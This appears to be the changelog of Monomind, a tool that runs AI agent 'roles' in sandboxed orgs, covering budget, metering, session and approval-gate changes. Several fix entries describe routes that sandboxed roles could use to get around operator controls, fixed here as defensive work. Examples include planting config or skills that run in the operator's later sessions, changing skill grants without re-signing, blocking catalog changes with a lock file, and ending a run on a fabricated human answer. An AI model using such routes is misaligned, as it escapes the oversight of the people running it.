# Changelog

All notable changes to Monomind (`monomind` umbrella + `@monoes/monomindcli`).

## [Unreleased]

### Fixed

- **The full-mode MCP tool count in the docs is derived from the registry, not typed (#642).** `doc/concepts/mcp-server.md`, `opencode.md` and `antigravity.md` said `MONOMIND_MCP_FULL=1` advertises 219 tools; `tools/list` over stdio returns 198 (the default roster is 20). The two counts are now `doc-count` markers (`mcp-tools-full`, `mcp-tools-default`) that `scripts/generate-doc-counts.mjs` reads from the built CLI's registry, so `--check` fails when a doc states another number.

## [2.24.1] — 2026-10-05

### Fixed

- docs: corrected MCP tool counts in the antigravity and opencode docs (Fixes #634) (#640).
- **The `monofence-ai` first-use pin follows the published 2.24.0 package (#638).** The 2.24.0 release bumped the workspace `monofence-ai` to 2.24.0 but left the first-use install pinned at 1.0.7 (lock entry and per-file code hashes included), so `main`'s CI failed the "pin equals workspace version" and fail-closed scanner tests, and the 2.24.0 CLI installs the older monofence from the registry. The pin, lock entry (URL and integrity, verified against the registry tarball) and version now match 2.24.0; the 16 `dist/*.js` hashes are unchanged because 2.24.0 differs from 1.0.7 only in its version number.
- **`monomind deps install` run from a checkout now writes the deps cache (#637).** When the checkout's own `node_modules` held the pinned Claude SDK, the command found it, printed "installed and verified" and wrote nothing, so org roles (whose sandbox can only use `~/.monomind/deps`) still lacked the SDK and a release's live Claude trials failed with EROFS. The command now always installs into the cache and says where.

### Changed

- **The version gate blocks a forced major bump of a sub-package, and the release rules say who takes the release number (#636, #639).** `scripts/check-package-bumps.mjs` now fails when a sub-package's major version rose since the last release tag without a breaking commit (`type(scope)!:` or a `BREAKING CHANGE:` footer) touching it; it skips when no release tag is reachable, and `MONOMIND_ALLOW_MAJOR_BUMP=1` is the escape hatch. Run against the 2.24.0 release commit it reports all eight mis-bumped packages. The release rules skill now states that only `monomind` and `@monoes/monomindcli` take the release number and that a package with a first-use pin moves its pin, lock and hashes in the same commit. The release org's instruction digest changed with the skill, so the operator re-signs `release` before the next run.

### Notes

- **Sub-package versions jumped to 2.24.0 (#636).** The 2.24.0 release published `@monoes/monobrowse` (was 1.0.30), `@monoes/monodesign` (1.2.25), `@monoes/hooks` (1.0.13), `@monoes/mcp` (1.0.7), `@monoes/memory` (1.0.23), `@monoes/monograph` (1.6.15), `@monoes/routing` (1.1.1) and `monofence-ai` (1.0.7) at 2.24.0 instead of on their own semver lines. None of them has a breaking change in this release: the number is a version bump only, it cannot be unpublished, and their lines continue from 2.24.0. Only `monomind` and `@monoes/monomindcli` track the release number.

## [2.24.0] — 2026-10-05

### Added

- **Every runtime is usable in a sections org, through the isolation registry.** Each runtime declares whether it can run inside a sections org's isolation; `kilo` and `freebuff` are refused with a stated reason (Kilo is full-access only and a sections org refuses full access; Freebuff's CLI has no headless transport), every other runtime is accepted. `agent scan` and `doctor -c agent-runtimes` report `execution_supported` and the reason.
- **A verified Kilo runtime and a Freebuff discovery stub (#600, #601).** `kilo` (CLI 7.8.3, explicit full access only, resume, reported cost, native tool activity) runs through `agent exec` and the Org Runtime; `freebuff` is discovered but refuses before spawning (its CLI has no headless transport).
- **Operator Claude selection (#596).** `--claude-path <absolute-file|bundled>`, `MONOMIND_CLAUDE_PATH` or `monomind config set claude.path`; an untrusted home or config directory that names no `claude.path` is no choice (one warning), not a failure.
- **Sections run as isolated sub-orgs, with docs as the only cross-section channel.** Each section is its own sub-org with its own roles, budget and lifecycle; the only path for one section to affect another is through the shared document store — no direct messaging or task routing crosses a section boundary.

### Fixed

- **Claude SDK pinned to 0.3.289, with a reviewed weekly refresh (#594).** The refresh workflow computes the new pins in a read-only job (the downloaded binary runs there) and opens the PR from a second job; actions are pinned to commits. The publish-time freshness check only warns when the registry is unreachable. The `org_*` tool schemas the SDK emits changed with the bump (the sections-off fixtures were regenerated for it).
- **Trusted runner inputs no longer sit in a writable temp root (#599).** The hermes, cline and kimi prompt files live under `<monomind home>/runner-inputs`, in one directory per org role that the sections role protection hides from every other role.
- **A dead session no longer leaves a stale `runtime.json` behind (Fixes #611).** Session teardown now clears the run's `runtime.json` so a crashed or killed role is never reported as still running.
- **A role's tool output is readable again (Fixes #622).** A formatting regression had made some tool output unreadable in the role's own transcript; tool output now renders as intended.
- **Bash's own timeout no longer races the task deadline (Fixes #623).** A Bash call's `timeout` is now capped against the task's remaining deadline, so a long-running command is stopped by whichever limit is shorter instead of the task deadline firing first and leaving the process behind.
- **Issue queue from #633:** Kilo runtime execution, Claude binary selection and reporting, assistant response usage (token) de-duplication, MCP status reporting from server runtime state, trusted runner-input protection, a release SDK preflight check, a Cline ACP test fix (ambient provider keys cleared in `cline-runner.test.ts`), and an init config refresh (#632).
- **Also in this batch:** #591, #592, #593, #595, #597, #610.

### Changed

- **Org sections are generally available.** A sections org no longer needs `run_config.experimental: "eval"`, and `org run`, `org serve`, resume and role restarts start it like any org. An org that still declares `experimental: "eval"` keeps the eval-harness-only start and the no-restart rule. The release build behind this: an OS-held single-daemon lock per org root (a network filesystem is refused), per-recipient mail digests that are immutable, hash-journalled and unreadable to other roles, authenticated task-routing envelopes, per-role private copies of Claude's native transcripts, a host preflight (authority mask, SDK sandbox, copy inventory) on every start, resume and role replacement, and an adversarial probe suite with a mutation check. Only Claude roles have a copy-inventory entry; other runtimes are refused in a non-eval sections org until they get one.
- **A sections org may run on a schedule.** `org validate` no longer refuses `schedule` for a sections org (an eval-mode org, `run_config.experimental: "eval"`, still cannot be scheduled: only the eval harness starts it). No carry-forward is needed: every scheduled start is a fresh run with its own run id and document store, through the same start path as a manual one, so the host preflight, the eval gate and the daemon lock apply. A tick that cannot start (preflight refusal), lands on a run that is already live, or lands mid-run now leaves a line in `<org dir>/schedule-audit.jsonl`, and a boss auto-restart during a scheduled run no longer leaves the restarted run outside the tick's `max_run` bound.

## [2.23.0] — 2026-10-04

### Added

- **Session cap with rotation digests.** With `run_config.context.session_cap` set to `{tasks, tokens}`, a role's SDK session ends between turns once it has been given that many distinct tasks or has used that many tokens (a native child's responses are not counted; a response split across messages counts once). The turn that crosses the cap finishes; the next message starts a fresh generation, and the loop checks on every path: a tagged task session, the role session, an untagged message, and at session start (a resumed session at the cap starts fresh, its resume dropped). The new generation's first message opens with a rotation digest: what the last generation did, the role's open tasks, the budget used, and a warning after two rotations in a row without a finished task; the digest is within 4,000 characters, and what is dropped is named, never cut. Counters persist in the run's `session-counters.json`, a `session-rotated` audit event records each rotation with its overshoot, and `session-cap-usage-missing` flags a runner that reports no usage. `packets.jsonl` generation records carry the rotation generation and the digest hash. An org with no `session_cap` is unchanged and writes no counters.
- **Role notes: `org_note_append` and injection into a fresh session.** With `run_config.context.notes: true`, a role gets `org_note_append`, which appends an entry to its own `<org dir>/notes/<role>.md`. The file is append-only: to curate, a role appends an entry with `current_state: true` that restates what still matters. Each fresh SDK session of that role starts with its last current state and the entries after it, ahead of the task, within 4,000 characters and without pushing the first message past 12,000; an entry is included whole or not at all, and an entry over 4,000 characters is rejected, never cut. A resumed session is left alone. The run's `packets.jsonl` records how many entries were included and left out and the hash of the injected block, and its first-message hash covers the notes. A bare `require_brief` or `session_cap` adds no notes tool, and an org without `notes: true` is unchanged. Notes are not yet protected from other roles' direct file access; that protection belongs to the sections design.
- **Summary-only returns.** In an org on the `run_config.context` surface, `org_task_done`'s `result` is a summary of at most 1,000 characters plus the ids and file paths of what the role produced. A longer result is rejected with a remedy and the task stays open; it is never truncated. The tool's description says so only for such an org. An org with no `context` key accepts any result length, as before.
- **Context packets with a record of what was injected.** In an org that adopted the `run_config.context` surface, `org_task` and `org_plan_graph` tasks take `references` (`files`, `memory_keys`, `task_ids`), listed after the brief in the task's dispatch. A packet over 256 distinct references, or whose title, brief and references together pass 12,000 characters, is rejected with a remedy; nothing is truncated. The runtime records what it injected in the run's `packets.jsonl`: each dispatched packet with the hash of every part, and the first message of each fresh SDK session (a generation) with its hash and the packet it carries. A resumed session adds no record; a new generation appends one. References are not snapshots: a path or key is listed, not captured.
- **An opt-in `run_config.context` surface, starting with typed brief fields.** An org that sets a `context` key (`require_brief`, `notes: true` or `session_cap`) now gets `objective`, `output`, `tools`, `boundaries` and `acceptance` arguments on `org_task` and on each `org_plan_graph` task. They are rendered with the existing free-text `brief` into the one brief the assignee receives, under the same 4,000-character limit; a longer brief is rejected, not truncated. With `require_brief: true` a task missing `objective` or `acceptance` is rejected (for `org_plan_graph`, the whole graph, so no half-built plan is left), and other missing fields come back as `warnings`. Without it, a missing `objective` or `acceptance` is only a warning. An org with no `context` key keeps its tool list and prompt byte for byte. `org validate` no longer reports `run_config.context` as unsupported.
- **Per-call context logging.** Every model call a role makes now appends one record to the run's `context.jsonl`: the size of its context (uncached input plus cache reads plus cache writes), how old its session is, its cache read and write tokens, and whether it was the first call of a session, a resumed session or a subagent's call. A response split across several messages is one record. The first call of a session shows the prefix cache read vs write at session start. `monomind org report <org> --context` prints, per role, the calls, sessions, mean and max context, cache hit ratio and the session-start cache split (`--json` gives the same figures). A run's other files are unchanged.
- **A shared checklist of org caveats, run wherever an org is saved or started.** `org validate`, `org run`/`org serve` start, `org reload`, `org create`, and the dashboard's config patch, import and create now run the same checks (`orgrt/validate-checklist.ts`). Errors stop the save or start; advice is a warning that never blocks, and a start records its warnings on the run's bus as `checklist-warning`.
  - **Errors:** a deferred feature in the definition (`sections`, `documents`, `loops`, `requires`, and `run_config.context`, `budget_usd`, `budget_mode`, `experimental`) used to be ignored silently and now fails with "not yet supported".
  - **Warnings:** an unknown top-level or `run_config` key, which the runtime would ignore; file scopes that do not cover the paths a role's duties name; shell duties with Bash denied; `max_concurrent_agents` below the role count (a finished worker keeps its slot, so roles past the cap wait); no `budget_usd` on any priced role; `budget_usd` on a codex or antigravity role, which reports no USD and is never closed by it; tools (Bash, WebFetch, WebSearch) that wait for a human approval nobody answers, and the same in a scheduled org; role text that tells a role to use `SendMessage`; a dated detail in a role prompt, which breaks the cached prefix; a boss prompt that does not require self-contained briefs; a role with no explicit model.


- **Org sections: an eval-only opt-in surface for sub-team structure within an org (`sections`).** A definition can now partition roles into sections with their own budgets, a single-writer policy per document, lead rights, loop/rework rounds, and spend-based soft closure with 80% budget notices to lead and root. This ships **eval-only**: a sections org must set `run_config.experimental: "eval"`, and `org run`/`org serve` refuse to start ANY org that uses `sections` from the CLI regardless of that flag — only the internal eval harness (which passes `evalGate: true` to `startOrg`) can start one (`packages/@monomind/cli/src/orgrt/documents/eval-gate.ts`, `definition.ts`). It is not yet available for general org use.

- **`policy.sandbox.denyExec` masks programs from a role's whole process tree.** Opt-in; a role's Bash tool and everything its process tree starts (a nested SDK sandbox included) run inside a bubblewrap layer where every matching binary is replaced and fails closed. A role without `denyExec` set is unchanged.

- **`policy.sandbox.denyRead` hides files and directories from a role's shell, in the same sandbox layer as `denyWrite`.** Opt-in; a role without it set is unchanged.

- **`policy.sandbox.homeWriteAllow` keeps a role's process tree from changing the real `$HOME`.** Opt-in: bubblewrap mounts a tmpfs overlay over the home (reads fall through, writes land in a throwaway upper layer) and binds only the allowlisted subpaths back read-write.

- **`run_config.verify_writes` (default on) refuses a completion over a demonstrably failed write.** A `WriteLedger` watches the bus for `Write`/`Edit`/`MultiEdit`/`NotebookEdit` calls, policy denials and `tool_result ok:false`. `org_task_done` is refused, naming the path, when that role has a failed write with no later success and the file is still missing or empty on disk; an `achieved` `org_complete` is refused for any role's unwritten deliverable. A report that names the path and says it is blocked is accepted; each `(scope, path)` is refused at most twice.

- **`run_config.lead_watch` (default on) nudges a lead when a role stalls.** A role with open work — an open `org_task`, or an actionable message from its `reports_to`/the boss — that has no session after `not_started_s` (default 90s) or no bus event for `silent_s` (default 180s) gets one `[watch]` message sent to its lead's mailbox, with doubling backoff, at most 3 per episode. Never fires for a role with no open work, a role that is progressing, or during a pending human wait; cancelling, re-creating for another role, or messaging the role settles it.
### Fixed

- **The run's task text reaches every role, not only the coordinator.** `org run --task` (and `startOrg`'s task argument) was sent to the coordinator as a message; every other role's system prompt carried the org goal alone. With a short goal and the details in the task, workers asked the lead for what the task said, or read the run's bus to recover it. Every role's prompt now has a `Task for this run:` block with the text, whenever it differs from the goal. A run with no task, or a task equal to the goal, keeps its prompts byte for byte. A resumed run restarted without `--task` still has the goal alone.
- **A tool-call fence that will not parse is returned to the role as an error.** Roles on the fence-protocol runners (codex, antigravity, opencode, kimi and others) call org tools by writing a ```tool_call block. A block with invalid JSON, such as an `org_send` whose message held raw newlines, or one cut off before its closing fence, was dropped with a note on the bus and nothing was sent back: the role believed the call had run and ended its turn, and the org could sit silent until the idle watchdog stopped it. The role now receives a `tool_result` saying its call could not be parsed, that nothing ran, and how to send it again; calls in the same reply that did parse still run. The bus note is unchanged.
- **A role stopped mid-query now reports its cost.** When an org completed or was stopped, every Claude role still working had its query killed outright; the query never sent a result, so its cost was never recorded. A short trial's meter showed $1.46 where its session transcripts put the spend near $5.65, and `budget_usd` closures never saw that spend. The Claude runner now interrupts the query first. The SDK answers with a result carrying the cost so far, which the runtime records like any other turn, as an `interrupted` stop that is not a failed turn and does not count toward the circuit breaker. A query that does not answer within 3 seconds is aborted as before.

- **A role's `budget_usd` is a hard stop on Claude roles.** USD cost arrives only when a turn ends, so one long turn could run far past the cap: in a 24-minute trial of an 11-role org capped at $10, a $0.80 role spent $6.50 and the org spent $27. Each Claude query now carries the SDK's `maxBudgetUsd`, set to what the role has left of its cap, so the SDK stops the query once it is exceeded. Overshoot is now limited to the model call in flight. That stop closes the role for budget like any exhausted cap; it is not counted as a failed turn, does not trip the circuit breaker and is not reported as a crash. A role with no USD left starts no query. Codex and antigravity roles report no USD and are unchanged.

- **The org token meter counts each model response once** ([#597](https://github.com/monoes/monomind/issues/597)). One API response can reach the SDK stream as several assistant messages that share a `message.id` and repeat the same input and cache usage. The live meter added every one of them, so roles were metered at roughly twice their real tokens: `usage` events were inflated and `budget_tokens` caps closed sessions early. The result-time settle only tops the meter up, so it never corrected this. The Claude runner now passes the response id through, and the meter counts only what a message adds over the largest usage already seen for that response. That also takes a response's final output count instead of the placeholder counts on its earlier messages. Subagent responses have their own ids and are still counted. USD costs were not affected.

- **The resource governor's SDK-session count no longer doubles when a role runs sandboxed.** It matched any process whose command line referenced the SDK package path; a sandboxed role's bubblewrap wrapper process matches too, so each role's session was counted twice and `MONOMIND_MAX_SDK_PROCS` throttled new role starts at roughly half its configured cap. It now reads the process table directly and counts only the actual SDK agent process per role.

## [2.22.0] — 2026-09-30

### Fixed

- **Codex and antigravity roles no longer spend many times their `budget_tokens` in one turn** ([#550](https://github.com/monoes/monomind/issues/550)). Both CLIs report the whole prompt as input, cached part included, and it was charged against `budget_tokens` as uncached input, so one turn could spend 7-35 times a role's budget and close every other role at the org-wide ceiling. The runners now move the cached part into `cache_read` / `cache_creation` (the `tokens` total is unchanged), so these roles are charged on the same basis as Claude roles. They also meter each agy step and each codex exec as it completes instead of once per message: an agy exec is killed at the step that exhausts the budget, a codex role starts no further tool round once it is spent, and neither starts an exec with less than 5% of the role's token cap left or after its session was closed for budget. The role is then closed for budget rather than counted as a failed turn. A codex exec that has started still runs to its end, since codex reports usage only then. See [Token budgets on codex and antigravity roles](doc/concepts/org-runtime.md#token-budgets-on-codex-and-antigravity-roles). A role closed because it is under that floor counts as out of budget: the coordinator's notice gives its numbers, and `org reload` reopens it only once its budget is raised above the floor.

  - `agent exec` and `agent test` report the same split: the `input_tokens` of a codex or antigravity run's `usage` event now excludes cached input, as it already did for Claude.

- **The org-wide token budget stops deferred lazy spawns** ([#552](https://github.com/monoes/monomind/issues/552)). When `run_config.budget_tokens` ran out, the org closed every open mailbox and stopped pending spawns, but a role already waiting for a `max_concurrent_agents` slot kept its retry loop. The closure freed slots, so the role spawned with an open mailbox after "closing all roles" and ran until idle-stop. The closure now cancels those deferrals (a `deferred-spawn-cancelled` audit per role) and holds their tasks with the budget reason. A deferred spawn, including one waiting on host resources, checks the org-wide ceiling and the role's own budget closure (its own caps or the #550 turn floor) right before it starts. `spawnRole` refuses while the ceiling is spent and logs a `spawn-refused` audit. A reload that raises the ceiling puts the roles back to pending, dispatches their tasks and delivers the messages queued for them. A role a reload adds while the ceiling is spent is set aside the same way, and its tasks are held instead of reported as unresolved.

  - A role replacement (`org_respawn_role`) no longer runs past the ceiling. If the ceiling closes while the replacement starts, the replacement is stopped instead of published, the old incarnation stays closed like the other roles, and its tasks are held. The org's spend stays exact: the old incarnation is counted once, and what the stopped replacement spent while starting is counted too. The cancelled replacement doesn't use up a `max_role_respawns` attempt. A reload that raises the ceiling reopens it with the mail it had swept up.

- **A role deferred by `max_concurrent_agents` stays a known assignee** ([#551](https://github.com/monoes/monomind/issues/551)). The deferral took the role out of the pending roles, so every later dispatch pass reported `dispatch-assignee-unresolved: assignee "X" does not resolve` for a role the org defines, and messages to it failed with "unknown recipient". Its tasks now wait `ready` with one `concurrency-limit` audit each ("deferred by max_concurrent_agents") and go out when the role spawns, whichever path deferred it. A second deferral of the same role joins the first retry loop instead of starting another. If no slot frees in time, the tasks waiting on the role are failed with the reason and the coordinator is told, instead of sitting `ready` with no owner. The role goes back to pending, so later work for it defers again. The give-up is written to the org state (`abandonedRoles`), and the coordinator is also told when only queued messages were waiting.

  - A role deferred under host resource pressure gets the same treatment: its tasks wait with one `resource-pressure` audit each and go out when it spawns.

  - A deferred role that spawns now delivers only its own queued messages. It drained the whole org inbox, so messages queued for other roles that weren't running yet were lost.

  - `deliver()` says "waiting for a concurrency slot" or "waiting for resources" to match the deferral.

- **A freed `max_concurrent_agents` slot goes to the role that was deferred first** ([#589](https://github.com/monoes/monomind/issues/589)). Each deferred role polled for a slot on its own timer, so the first timer to fire after a slot freed took it. A role deferred later could start ahead of one deferred earlier, and could keep doing so each time a slot freed. A role now takes a free slot only when no role deferred before it is still waiting for one; its `concurrency-limit` audit then says which roles it is waiting behind. A role that was not deferred, started directly by a message or task, can still take a freed slot before the next deferred role polls.

- **An approval a decider owns now holds the tool call until the decider rules, instead of denying it as "pending human approval"** ([#553](https://github.com/monoes/monomind/issues/553)). monomind now routes a request the way mono-agent does, using a port of its decision class, tier and level × tier routing. With `mid` or `full` autonomy and a model, boss, parent or jev decider, a call that mono-agent sends to a rule or a decider waits for the verdict. For example, `tool:Bash` is routine unless a `tool:Bash` or `tool:*` tier says otherwise. The wait lasts up to `decider.timeout_seconds` + 25s: the timeout defaults to 120s, and the total wait is capped at 300s, below the 600s PreToolUse hook timeout. The call does not wait when mono-agent sends the request to a person: at `mid`, that covers irreversible tiers and grants with no known tier. It also does not wait at `manual`, during an active `paused_until`, or when the autonomy block is missing or not understood. The autonomy block is read fresh from the org file on each check. When the verdict is approve, the call runs. A denial names who decided. If no decision comes in time, the message says a decider or a human will resolve it and an `[approval]` message follows. A call that got its verdict while waiting never gets an `[approval]` message telling it to repeat, so it never runs twice. That holds even when a human resolves it together with other entries. Mailbox messages name the resolver: a rule, the decider, or a human (`--by` name). Waits end when the org stops or the role closes. Known gap: `monoagentcli org autonomy pause` writes only mono-agent's database, so monomind does not see the pause until mono-agent adds `paused_until` to the org file. Known limit: a grant's own tier lives only in mono-agent's database. At `mid`, a grant that mono-agent rates `consequential` goes to its decider, for example one with no outbound workflow nodes. monomind can't see that tier, so the call does not wait; it is denied as pending at once, as before. A `grant:<alias>` or `grant:*` tier in the org file avoids this. Every runtime goes through the same in-process gate: claude's `canUseTool` and PreToolUse hook, and the in-process org-tool calls of codex, grok, hermes, antigravity and vercel, all wait inline. Approvals owned by a human are unchanged.

- **Vercel and openrouter roles post one `chat` event per assistant message** ([#563](https://github.com/monoes/monomind/issues/563)). The vercel runner yielded every streamed text delta as its own message, so the org bus carried a `chat` event per chunk ("I", "'ve asked the question", ...), which filled history and event limits. It now joins the deltas and yields one message when the model step ends, like the claude, codex and aider runners. A turn that is aborted or fails midway still reports its text once. `agent exec` still streams the deltas, since it asks for partial messages.

  - A vercel turn whose stream carries an `error` or `abort` event is now reported as failed (`error_during_execution`, `is_error`) with the error message, like a failed claude turn. It was reported as `success`, so the circuit breaker never counted it and `agent exec` exited 0 instead of reporting a `rate-limited`, `auth`, `quota` or `runner-error` code.

- **`agent test pi-rpc` no longer fails with `turn failed (error_max_turns)` when the model runs one of pi's own tools before it answers** ([#564](https://github.com/monoes/monomind/issues/564)). pi counts one turn per model call, so a model that lists or reads the temporary directory before replying `ok` needs a second turn, and `agent test` capped the turn at one: the runner aborted the answer. `agent test` now allows 3 turns for every runtime. Plain replies were never affected; checked against pi 0.87.1, which starts exactly one turn for them, retries included.

- **A blocking `ask_human` question now stops `org_complete` until it is answered** ([#564](https://github.com/monoes/monomind/issues/564)). A boss could ask a blocking question and end the run in the same turn with an answer it made up. While any blocking question in the org is unanswered, `org_complete` is refused with a tool error naming the question ids; it works again once the answer arrives. The one outcome still allowed is `partial` with blocker `human`, also under `run_config.completion: 'dag'` while runnable work remains, so a run whose human never answers can still be ended honestly. Non-blocking questions don't hold it. The blocking receipt now tells the role to end its turn and not call `org_complete`. A blocking question still does not hold the role's turn open: as documented, the answer arrives as a new message.

- **The session ledger and its `session-run` audit name the runtime a role actually runs on** ([#562](https://github.com/monoes/monomind/issues/562)). They used `role.runtime ?? def.runtime ?? 'claude'`, so a role whose runtime comes from `provider.kind` (`vercel-api-key` runs on `vercel`, `codex` on `codex`, `antigravity` on `antigravity`) was audited as `claude` and had its task sessions filed under `claude`. Both now use the runtime that runner selection resolves. A task session an older build filed under `claude` for such a role is still resumed on `org run --resume` and moves to the new key when it is. Only a role with no `runtime` of its own or of the org's reads that old key, because only its entries there came from its own runner.

  - The full-access check and its audit, the sandbox and authority-mask choice, `org validate`'s sandbox findings and `org sign`'s review use that runtime too ([#567](https://github.com/monoes/monomind/issues/567)). A `provider.kind` role was checked as Claude, so a vercel role declaring `policy.access: full` passed the runner check it fails, so a signed grant made it `full` on a runner without full access; a vercel role was given an authority mask its in-process runner never applies; and `org sign` counted a codex role as covered by Claude's sandbox. A role that sets `runtime` itself is checked as before. A `MONOMIND_RUNTIME` value no runner answers to is checked as `claude`, the runner that then runs.

- **An open `ask_human` question can be dismissed, and a removed role's question can be closed** ([#572](https://github.com/monoes/monomind/issues/572)). An open blocking question holds `org_complete` (#564), and until now the only way to close one was to answer it. `monomind org questions dismiss <org> <id> [--reason <text>]` closes it without an answer: `questions.json` records `state: "dismissed"`, `dismissedAt` and the reason, the `org_complete` gate and the idle-watchdog hold are released, and the asking role is told that no answer is coming (live, or queued while the org is stopped, without waking it). A running org logs a `decision-resolved` audit event with `verdict: "dismissed"`. The dashboard's Human Input view has a Dismiss button (`POST /api/questions/dismiss`, the same human-session auth as answering), and the daemon route is `/api/dismiss-question` (operator credential only). Answering a question whose role is no longer in the org definition failed with "role not found", so it could never be closed. The answer or dismissal is now recorded and delivery is skipped, with a `delivery: "skipped"` note in the audit event.

- **`org approve`, `org deny`, `org answer` and `org gate-approve` / `gate-reject` no longer resolve a decision behind a refusing daemon** ([#572](https://github.com/monoes/monomind/issues/572)). **Security:** when the daemon running the org refused the call, for example with a 403 because the operator credential was missing, the command fell back to writing `approvals.json`, `gates.json` or `questions.json` (plus the inbox) directly. That approved a tool call or gate, or answered a question, without the operator check, the audit event or delivery to the waiting role. A refusal now fails with "nothing recorded" and exit code 1. The offline write happens only when the daemon can't be reached. The commands also ask only a daemon that hosts this project's org, the same lookup the dashboard uses, so a same-named org run from another project no longer receives the decision.

- **A role's blueprint is now covered by the org signature** ([#571](https://github.com/monoes/monomind/issues/571)). A role with a `blueprint` and no `skills` gets its `skills` and `skill_pool` from the catalog's `blueprint.json` when the org starts. That file lives in the project's `.monomind/catalog/`, which the #502 signature did not cover and which a role may be able to write, so the skills (and the MCP tools they grant) a role got could change without the org being re-signed. The signed hash now records a `sha256:` digest of each named blueprint's `blueprint.json` under a new `blueprints` key, next to the `instructions_file` digests; the same single read feeds the review, `--check`, `--expect-hash` and the start-time check. `org run` and `org reload` use a blueprint only while its bytes still have the digest the signature was checked with. An org that uses a blueprint verifies as `changed` after the upgrade and needs `monomind org sign` once; an org without blueprints hashes exactly as before. `org sign`'s review lists each role's `blueprint`. The hash is documented in [`org sign`](doc/commands/org.md#the-signable-hash) with a pinned example.

- **Org roles can no longer change the skill catalog** ([#576](https://github.com/monoes/monomind/issues/576)). The content of a role's catalog skills and their `grantedTools` (which decide the MCP tools the daemon grants) are read at org start from the project's `.monomind/catalog/`, which the org signature does not cover beyond skill names. That directory was writable to roles, and `monomind catalog` ran inside them, so a role could re-stage or re-activate a catalog skill and change what another role got on its next start without the org being re-signed. `.monomind/catalog/` is now an operator-protected path, like `.monomind/org-skills/`: denied to the file tools, in the SDK sandbox's `denyWrite` and read-only under the bubblewrap mask, for the org root and a role's cwd, and created empty before a role starts so it can't be planted (an empty directory still means the catalog is not configured; a refused `catalog stage` no longer removes it again while roles run). `monomind catalog stage`, `approve`, `activate`, `disable`, `quarantine`, `release`, `revoke`, and `project`/`unproject --apply`, refuse inside an org role or `agent exec` process tree, as `org sign` does. Roles can still read the catalog and run the read-only verbs and projection dry runs; a signed `policy.sandbox.allowWrite` entry naming `.monomind/catalog` is the opt-in. See [Skill Catalog](doc/concepts/catalog.md#3-commands).

- **`agent exec --runtime claude` works inside an org role again** ([#559](https://github.com/monoes/monomind/issues/559)). `~/.monomind/deps` is read-only to roles (#527), so a role could never do the first-use install of the Claude Agent SDK and failed with EROFS. The deps directory stays read-only: it holds code the unsandboxed daemons load. Instead, the org runtime installs the pinned SDK on the host, through the same hash-pinned installer, before it starts a role session whose effective runtime is claude (the runtime runner selection resolves: role, org, provider kind, then `MONOMIND_RUNTIME`). Roles on other runtimes get no download, so a codex-only org never fetches the 300 MB SDK. An SDK installed without its bundled binary (#522) counts as installed. The install is logged as a `role-deps-installed` audit. A failed install is logged as a `role-deps-missing` audit, does not stop the role, and is not retried for 10 minutes; a session start waits for it at most 5 minutes or until the org stops. `MONOMIND_NO_AUTO_INSTALL=1` turns the host install off, for offline or no-network hosts. Inside a role, a missing SDK now fails at once, before any install attempt, and names the operator command. The new `monomind deps install` command installs the SDK even with `MONOMIND_NO_AUTO_INSTALL` set, since it is an explicit request, and refuses to run inside an org role.

- **The test suites no longer inherit an org role's environment** ([#560](https://github.com/monoes/monomind/issues/560)). A suite run from inside an org role picked up `MONOMIND_ORG_ROLE`, which moves cline's scoped dir under the role's TMPDIR, so `cline-runner.test.ts` and `cline-runner-scoped.test.ts` failed. The shared test setup (`tests/setup/isolated-home.global.ts`) now unsets the markers a role session and its runners set: `MONOMIND_ORG_ROLE`, `MONOMIND_ROLE_ID`, `MONOMIND_ORG_NAME`, `MONOMIND_ORG_DIR`, `MONOMIND_ORG_RUN`, `MONOMIND_ORG_ROOT`, `MONOMIND_AGENT_EXEC`, `MONOMIND_SDK_AGENT`, `MONOMIND_CLINE_TURN`, `MONOMIND_AIDER`, `MONOMIND_HOOK_QUIET`, `MONOMIND_GRAPH_GATE`, `MONOMIND_GIT_LEVEL` and `MONOMIND_EXEC_TREE`.

- **Other runtimes' project config is now operator-protected from org roles, `.agents/skills` included** ([#580](https://github.com/monoes/monomind/issues/580)). `monomind catalog project --surface platform:agents` writes skills to `.agents/skills`, and the operator's Codex, Gemini, Kimi, OpenCode and other sessions load them, but unlike `.claude/` a role could write it, so it could plant or change a skill a later operator session loaded. The same held for the rest of what those sessions load and act on from the project: `.gemini/` (`settings.json` MCP servers and hooks, the status-line helpers), `.codex/` (`config.toml` MCP servers and hooks, the hook scripts), `.kimi-code/` (MCP servers, plugin hooks), `.opencode/` and `opencode.json`/`opencode.jsonc` (plugins, and the `node_modules` OpenCode installs for them), `.agents/monomind/` (the hook bridge rendered hooks run), agy's `.agents/hooks.json`, `.agents/plugins/` and `.agents/skills.json`, `.qwen/` (settings, `.env`, commands, agents, skills, extensions), `crush.json`/`.crush.json`, `crushrc`/`.crushrc` and `.crush/skills`, `.pi/` (settings, extensions, skills, prompts, themes, system prompt, installed packages), Cline's `.clinerules/hooks` and `workflows`, `.aider.conf.yml`, `.cursor/`, `.vscode/mcp.json`, `.kiro/` and `.factory/`: a role that wrote one got code run in the operator's next session there. Where a runtime writes into its own project dir while it runs as a role, only the parts it loads are protected, so it keeps working: OpenCode writes `.opencode/.gitignore` at every start and exits when it can't, pi creates `.pi/settings.json.lock` to read its settings, Qwen Code writes `.qwen/worktrees/` and `batch/`, and agy writes `.agents/teamwork/`. With the org root or a role cwd at `$HOME`, the runtimes' own home state dirs (`.codex`, `.gemini`, `.kimi-code`, `.qwen`, `.pi`, `.opencode`, `.cursor`, `.factory`, `.kiro`) are left alone, since those runtimes write their sessions there. Each (at the org root and a role's cwd) is now denied to the file tools, in the SDK sandbox's `denyWrite` and read-only under the bubblewrap mask once it exists. Like `.claude/` none is created at org start, so repos get no stray directories; while one is missing it is on the planted-path watch, so one a role creates is quarantined (one the operator creates while an org runs, for example with `monomind init` or `catalog project --apply`, is quarantined too and restored with the `mv … && monomind org approve-paths …` the notice gives). Instruction files (`AGENTS.md`, `GEMINI.md`, `QWEN.md`, rules) stay writable, as `CLAUDE.md` does, and so does runtime state such as Crush's `.crush/` data dir. A full-access pi role in coder mode whose trusted project settings declare packages needs a signed `allowWrite` for `.pi/npm` / `.pi/git` to install them. A signed `policy.sandbox.allowWrite` entry naming the path is the opt-in. `.claude/skills` and `.agents/skills` are the catalog's only projection targets.

- **A role can no longer block the operator's catalog changes with a lock file** ([#581](https://github.com/monoes/monomind/issues/581)). The catalog lock was `.monomind/locks/catalog.lock`, which roles can write, so a role could create it and make every `monomind catalog` mutation fail with "catalog is locked". The lock is now `.monomind/catalog/.lock`, inside the operator-protected catalog directory. A leftover lock at the old path from an older version is ignored and left where it is. A refused mutation in a project with no catalog no longer leaves an empty directory behind.

